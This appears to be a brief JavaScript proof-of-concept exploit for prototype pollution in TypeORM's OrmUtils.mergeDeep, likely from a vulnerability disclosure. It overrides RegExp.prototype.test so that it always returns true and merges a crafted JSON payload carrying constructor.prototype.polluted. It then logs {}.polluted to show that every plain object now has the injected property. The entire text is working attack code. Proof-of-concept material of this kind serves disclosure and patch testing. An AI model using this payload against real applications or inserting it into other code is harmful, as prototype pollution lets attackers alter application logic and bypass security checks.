RegExp.prototype.test = () => true;
var typeorm = require('typeorm/util/OrmUtils');
const a = {};
const b = JSON.parse(`{"constructor": {"prototype": {"polluted":"yes"}}}`);
console.log({}.polluted);
typeorm.OrmUtils.mergeDeep(a, b);
console.log({}.polluted);